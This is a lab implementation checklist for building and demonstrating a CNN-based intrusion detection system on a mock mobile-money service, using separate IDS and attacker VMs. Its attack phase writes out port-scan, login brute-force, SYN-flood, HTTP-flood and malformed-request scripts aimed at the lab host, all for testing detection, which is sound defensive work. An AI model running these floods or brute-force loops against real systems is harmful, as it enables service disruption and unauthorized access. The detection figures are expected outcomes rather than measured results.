# Implementation Checklist: From Code to Running System

## **PHASE 1: VERIFY LOCAL ENVIRONMENT**

### Step 1.1: Check Project Structure
```bash
cd ~/Documents/Playground/predictive-ids

# Verify all required files exist
ls -la | grep -E "(docker-compose|api|inference|dashboard|model|preprocessing)"

# You should see:
✓ docker-compose.yml
✓ api/
✓ inference/
✓ dashboard/
✓ model/
  ├─ onemoney_cnn.h5
  └─ scaler.pkl
✓ preprocessing/
✓ data/
  ├─ raw/
  │  └─ OneMoney_Training_v3_10k.csv
  └─ processed/
     ├─ X_train.npy
     ├─ y_train.npy
     ├─ scaler.pkl
     └─ feature_names.txt
```

**If missing files:**
- `model/*.h5` - Run `python train.py` to train the model
- `data/processed/*` - Run `python preprocessing/preprocess.py` first
- Dataset CSV - Ensure it exists in `data/raw/`

### Step 1.2: Verify Docker Installation
```bash
# On your Mac:
docker --version        # Should be Docker 4.0+
docker-compose --version # Should be 2.0+

# Test Docker
docker run hello-world
```

**If Docker not installed:**
- Install from: https://docs.docker.com/desktop/install/mac-install/

---

## **PHASE 2: PREPARE VMs (UTM/QEMU)**

### Step 2.1: VM Setup Checklist

**IDS-Lab VM (192.168.64.4):**
```bash
# SSH into IDS-Lab
ssh ubuntu@192.168.64.4

# Verify system
uname -a                    # Should show ARM Linux
hostname                    # Should be "ids-lab" or similar
ip addr show eth0           # Should show 192.168.64.4

# Install Docker (if not already installed)
curl -fsSL https://get.docker.com | sh

# Add user to docker group (avoid sudo)
sudo usermod -aG docker ubuntu
newgrp docker

# Verify docker works
docker ps
```

**Attacker VM (192.168.64.5):**
```bash
# SSH into Attacker
ssh ubuntu@192.168.64.5

# Verify system
ip addr show eth0           # Should show 192.168.64.5

# Install attack tools
sudo apt update
sudo apt install -y nmap hydra hping3 netcat-openbsd curl

# Verify tools
nmap --version
hydra --version
```

### Step 2.2: Network Connectivity Test
```bash
# From Mac:
ping 192.168.64.4           # IDS-Lab
ping 192.168.64.5           # Attacker

# From Attacker VM:
ping 192.168.64.4           # Should respond
curl http://192.168.64.4:9000  # Will fail (service not running yet)
```

---

## **PHASE 3: COPY PROJECT TO IDS-LAB VM**

### Step 3.1: Copy Files
```bash
# Option A: Using SCP (from Mac terminal)
scp -r ~/Documents/Playground/predictive-ids ubuntu@192.168.64.4:~/

# Option B: Using git (if you have a private repo)
ssh ubuntu@192.168.64.4
cd ~
git clone <your-repo-url> predictive-ids

# Option C: Manual copy via shared folder (if using UTM shared folders)
# (Copy files using Finder to shared location)
```

### Step 3.2: Verify on IDS-Lab
```bash
# SSH into IDS-Lab
ssh ubuntu@192.168.64.4

# Check files copied
cd ~/predictive-ids
ls -la

# You should see:
✓ docker-compose.yml
✓ api/
✓ inference/
✓ dashboard/
✓ model/
  ├─ onemoney_cnn.h5
  └─ scaler.pkl
✓ data/
✓ preprocessing/
```

---

## **PHASE 4: BUILD & START SERVICES**

### Step 4.1: Build Docker Images
```bash
# On IDS-Lab VM
cd ~/predictive-ids

# Build images (first time only, takes 5-10 minutes)
docker-compose build

# Monitor build progress
# You should see:
# Building elasticsearch
# Building logstash
# Building kibana
# Building mongodb
# Building inference
# Building api
```

### Step 4.2: Start Services
```bash
# Start all services in background
docker-compose up -d

# Monitor startup
docker-compose logs -f

# Wait for "healthy" status (2-3 minutes)
docker-compose ps

# You should see:
# CONTAINER          STATUS
# ids-elasticsearch  Up (healthy)
# ids-logstash       Up
# ids-kibana         Up
# ids-mongodb        Up
# ids-inference      Up
# ids-api            Up
```

### Step 4.3: Verify Services are Healthy
```bash
# Test Elasticsearch
curl http://localhost:9200/_cluster/health
# Output: {"status":"green"}

# Test API
curl http://localhost:8000/
# Output: {"status":"running"}

# Test MongoDB
docker exec ids-mongodb mongosh --eval "db.adminCommand('ping')"
# Output: { ok: 1 }
```

---

## **PHASE 5: CREATE MOCK MFS SERVICE**

### Step 5.1: Create Mock Service
```bash
# On IDS-Lab VM
cat > ~/mock_mfs.py << 'EOF'
from fastapi import FastAPI
import uvicorn
import json
from datetime import datetime

app = FastAPI()

@app.get("/")
def health():
    return {"status": "MFS service running"}

@app.get("/balance")
def get_balance(account: str = "12345"):
    return {
        "account": account,
        "balance": 50000,
        "currency": "ZWL",
        "timestamp": datetime.now().isoformat()
    }

@app.post("/transfer")
def transfer(amount: int = 100, to_account: str = "54321"):
    return {
        "status": "success",
        "amount": amount,
        "to_account": to_account,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/login")
def login(user: str, password: str = "pass"):
    # Log this for Logstash to capture
    return {
        "user": user,
        "logged_in": True,
        "timestamp": datetime.now().isoformat()
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=9000)
EOF

# Install FastAPI
pip install fastapi uvicorn

# Run mock MFS service
python ~/mock_mfs.py &
# Output: Uvicorn running on http://0.0.0.0:9000
```

### Step 5.2: Test Mock Service
```bash
# From Attacker VM
curl http://192.168.64.4:9000/
# Output: {"status":"MFS service running"}

curl http://192.168.64.4:9000/balance?account=alice
# Output: {"account":"alice","balance":50000,...}
```

---

## **PHASE 6: CREATE ATTACK SCRIPTS**

### Step 6.1: Create Benign Traffic Script
```bash
# On Attacker VM
cat > ~/benign_traffic.sh << 'EOF'
#!/bin/bash

TARGET="192.168.64.4"
PORT=9000

echo "[*] Starting benign traffic to MFS service..."

while true; do
  # Normal API calls (simulating legitimate users)
  curl -s http://$TARGET:$PORT/balance?account=alice
  curl -s http://$TARGET:$PORT/balance?account=bob
  curl -s http://$TARGET:$PORT/login?user=alice&password=correct
  curl -s http://$TARGET:$PORT/transfer?amount=100&to_account=bob
  
  sleep 2
done
EOF

chmod +x ~/benign_traffic.sh
```

### Step 6.2: Create Known Attacks Script
```bash
# On Attacker VM
cat > ~/attack_known.sh << 'EOF'
#!/bin/bash

TARGET="192.168.64.4"

echo "[KNOWN-1] Port scan (nmap)"
nmap -p 1-1000 $TARGET

echo "[KNOWN-2] Brute force login"
for pass in password password123 admin admin123 root root123; do
  curl -s http://$TARGET:9000/login?user=admin&password=$pass
done

echo "[KNOWN-3] SYN flood"
hping3 -S -p 9000 --flood $TARGET &
sleep 10
pkill -f "hping3 -S"

echo "[KNOWN-4] HTTP flood"
for i in {1..100}; do
  curl -s http://$TARGET:9000/balance &
done
wait

echo "[KNOWN] Attacks complete"
EOF

chmod +x ~/attack_known.sh
```

### Step 6.3: Create Unknown/Zero-Day Attacks Script
```bash
# On Attacker VM
cat > ~/attack_unknown.sh << 'EOF'
#!/bin/bash

TARGET="192.168.64.4"

echo "[UNKNOWN-1] Fragmented SYN packets"
hping3 -f -S -p 9000 --flood $TARGET &
sleep 5
pkill -f "hping3"

echo "[UNKNOWN-2] Randomized port scan"
ports=(8001 5432 3306 4000 9001 8080 443 22 1433)
for port in "${ports[@]}"; do
  nc -zv -w 1 $TARGET $port 2>&1 | grep -E "succeeded|refused" &
done
wait

echo "[UNKNOWN-3] Slow brute force (rate-limited)"
for i in {1..20}; do
  curl -s http://$TARGET:9000/login?user=admin&password=guess$i
  sleep 0.5
done

echo "[UNKNOWN-4] Malformed HTTP requests"
python3 << 'PYTHON'
import socket
TARGET_IP = "192.168.64.4"
TARGET_PORT = 9000

for _ in range(5):
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    # Send malformed HTTP
    sock.sendall(b"GET  /balance  HTTP/1.1\r\nX-Weird-Header: ;;;;\r\n\r\n")
    sock.close()
  except:
    pass
PYTHON

echo "[UNKNOWN] Attacks complete"
EOF

chmod +x ~/attack_unknown.sh
```

---

## **PHASE 7: RUN DEMO (PROOF OF CONCEPT)**

### Step 7.1: Start Monitoring
```bash
# Terminal 1 (on Mac): Open dashboard
open http://localhost:3000

# Terminal 2 (on Mac): SSH into IDS-Lab
ssh ubuntu@192.168.64.4
cd ~/predictive-ids
docker logs -f ids-inference | grep -E "Classified|ATTACK|BLOCKED"

# Terminal 3 (on Mac): SSH into Attacker VM
ssh ubuntu@192.168.64.5
```

### Step 7.2: Run Baseline (2 minutes)
```bash
# Terminal 3 (Attacker VM): Start benign traffic
~/benign_traffic.sh &

# Wait 30 seconds, then check dashboard
# You should see:
# ✓ 0-5 BENIGN alerts
# ✓ Confidence: 95%+
# ✓ Status: GREEN
# ✓ No attacks detected
```

### Step 7.3: Run Known Attacks (3 minutes)
```bash
# Terminal 3: Kill benign traffic
pkill -f "benign_traffic.sh"

# Run known attacks
~/attack_known.sh

# Watch dashboard:
# ✓ Alerts increase to 10-15
# ✓ Types: "Port Scan", "Brute Force", "SYN Flood"
# ✓ Confidence: 85-94%
# ✓ Status: DANGER
# ✓ 1 IP blocked: 192.168.64.5
```

### Step 7.4: Verify Blocking
```bash
# Terminal 2 (IDS-Lab): Check iptables
sudo iptables -L -n | grep 192.168.64.5
# Output: DROP all -- 192.168.64.5 0.0.0.0/0

# Terminal 3 (Attacker): Try to reconnect
curl http://192.168.64.4:9000/balance
# Result: curl: (28) Operation timed out
# (Connection is dropped by iptables)

# Terminal 2: Check MongoDB
docker exec ids-mongodb mongosh ids_db
> db.blocked_ips.find({active: true})
# Output: {ip: "192.168.64.5", reason: "CNN inference", active: true}
```

### Step 7.5: Run Unknown Attacks (3 minutes)
```bash
# Unblock attacker IP first (for comparison)
curl -X DELETE http://localhost:8000/api/unblock/192.168.64.5

# Terminal 3: Run unknown attacks
~/attack_unknown.sh

# Watch dashboard:
# ✓ Alerts spike again
# ✓ Types: "Protocol Anomaly", "Unusual Pattern"
# ✓ Confidence: 68-89% (lower than known attacks, still > 0.40 threshold)
# ✓ CNN still detects them (key demo point!)
```

---

## **PHASE 8: VERIFY & DOCUMENT**

### Step 8.1: Collect Demo Evidence
```bash
# Screenshot dashboard at each phase:
1. Baseline (no attacks)
2. Known attacks (spike)
3. Blocked IP (dashboard shows "BLOCKED")
4. Unknown attacks (CNN still detects)
5. Metrics (detection rate, confidence, latency)

# Record metrics:
- Total alerts: ___
- Detection rate: ___%
- False positives: ___
- Avg confidence: ___%
- Response latency: __ seconds
- Blocked IPs: ___
```

### Step 8.2: Verify Objectives
```bash
# Objective 1: Zero-day detection
✓ Unknown attacks detected with 68%+ confidence
✓ Signature-based IDS would miss these

# Objective 2: Multi-source correlation
✓ Network features (76 CICFlowMeter)
✓ Application logs (failed logins)
✓ All correlated in ELK + CNN

# Objective 3: Automated blocking
✓ <1 second response latency
✓ iptables rules auto-applied
✓ IP persisted in MongoDB

# Objective 4: Real-time dashboard
✓ React dashboard shows alerts in real-time
✓ All metrics visible (confidence, severity, status)
```

---

## **TROUBLESHOOTING GUIDE**

| Issue | Diagnosis | Solution |
|-------|-----------|----------|
| Services won't start | `docker-compose logs` | Check docker-compose.yml syntax |
| ES unhealthy | `docker logs ids-elasticsearch` | Wait 1-2 min, check memory (512MB set) |
| No alerts in dashboard | `docker logs ids-inference` | Check if logs are flowing to ES |
| Inference crashes | `docker logs ids-inference` | Check model/onemoney_cnn.h5 exists |
| Dashboard blank | Browser console | Check API connectivity (8000 → 8000) |
| IP not blocking | `sudo iptables -L` | Check inference service has `privileged: true` |
| Traffic not captured | tcpdump | Check Logstash config has right input |
| Can't reach attacker VM | `ping 192.168.64.5` | Check UTM network config |

---

## **QUICK REFERENCE COMMANDS**

```bash
# View all logs
docker-compose logs -f

# View specific service
docker logs -f ids-inference
docker logs -f ids-elasticsearch

# Restart services
docker-compose restart

# Stop all
docker-compose down

# Check active blocks
sudo iptables -L -n | grep DROP

# Check MongoDB
docker exec ids-mongodb mongosh ids_db
> db.alerts.count()
> db.blocked_ips.find()

# Clear alerts (if needed)
docker exec ids-mongodb mongosh ids_db
> db.alerts.deleteMany({})
> db.blocked_ips.deleteMany({})
```

---

## **SUCCESS CRITERIA**

After running this checklist, you should have:

✅ All Docker services running and healthy  
✅ Mock MFS service responding on port 9000  
✅ Benign traffic showing 0 attacks  
✅ Known attacks detected with 85-94% confidence  
✅ Unknown attacks detected with 68-89% confidence  
✅ Auto-blocking working (attacker cannot reconnect)  
✅ Dashboard showing real-time alerts  
✅ All 4 objectives demonstrated  

**If all ✅, your demo is ready for presentation!**
